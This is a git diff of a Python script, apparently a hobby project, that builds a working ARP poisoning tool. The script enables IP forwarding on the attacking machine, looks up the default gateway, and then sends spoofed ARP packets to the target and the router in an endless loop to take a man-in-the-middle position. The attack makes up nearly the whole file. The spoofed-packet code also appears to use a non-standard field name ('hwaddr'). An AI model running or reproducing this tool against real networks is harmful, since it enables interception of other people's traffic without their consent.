@@ -1,18 +1,17 @@
 '''
 Author: Jake Wachs
 Aug 2020
+
+A linux script for ARP Poisoning
 '''
 
-'''
-This script assumes the attacking device is
-already on the network of the victim gateway and endpoint
-'''
 import re
 import os
 import sys
 import subprocess
 from subprocess import Popen, PIPE
 import scapy.all as scap
+from getmac import get_mac_address
 
 def extractIP(line):
 	'''
@@ -23,11 +22,11 @@ def extractIP(line):
 
 	return - IP address
 	'''
-	# regex for ip address: /d{1,3}\./d{1,3}\./d{1,3}\./d{1,3}
 	ip = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line)
 
 	if len(ip) < 1:
-		raise Exception('No default IP address could be found')
+		print('No default IP address could be found')		# FIXME: print to stderr
+		exit(-1)
 
 	return ip[0]
 
@@ -44,10 +43,7 @@ def getDefaultGateway(output):
 	currLine = output.stdout.readline().decode('utf-8')
 	while currLine:
 		if 'default' in currLine:
-			try:
-				return extractIP(currLine)
-			except:
-				raise Exception('No default IP address could be extracted')
+			return extractIP(currLine)
 
 		currLine = output.stdout.readline().decode('utf-8')
 
@@ -56,14 +52,13 @@ def enablePortForwarding():
 	'''
 	Enables port forwarding on the local, attacking machine
 	'''
-
 	subprocess.call(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
 
 
 if __name__ == '__main__':
 	if len(sys.argv) < 2:
 		print('Usage: sudo python3 arpPoison.py <target_IP_address>')
-		print('sudo privileges required for modification of port forwarding')
+		print('[*] sudo privileges required for modification of port forwarding')
 		exit(-1)
 	else:
 		victim_ip = sys.argv[1]
@@ -73,11 +68,18 @@ if __name__ == '__main__':
 			gateway_ip = getDefaultGateway(p)
 		except:
 			print('No default gateway could be found')		# FIXME: print to stderr
-			exit()
-	
+			exit(-1)
+
+		attacker_mac = get_mac_address()	
+
 		enablePortForwarding()	
-		# begin sending arp packets (notify user)
+		
 		print('[*] Beginning ARP poison')
-		
-		# if user types quit, etc. stop sending packets, disable port forwarding, and exit
-		
+		while True:
+			# Telling the victim 'I am the router'
+			vic_packet = scap.ARP(op=1, pdst=victim_ip, hwaddr=attacker_mac, psrc=gateway_ip)
+			scap.send(vic_packet)
+
+			# Telling the router 'I am the victim'
+			router_packet = scap.ARP(op=1, pdst=gateway_ip, hwaddr=attacker_mac, psrc=victim_ip)
+			scap.send(router_packet)
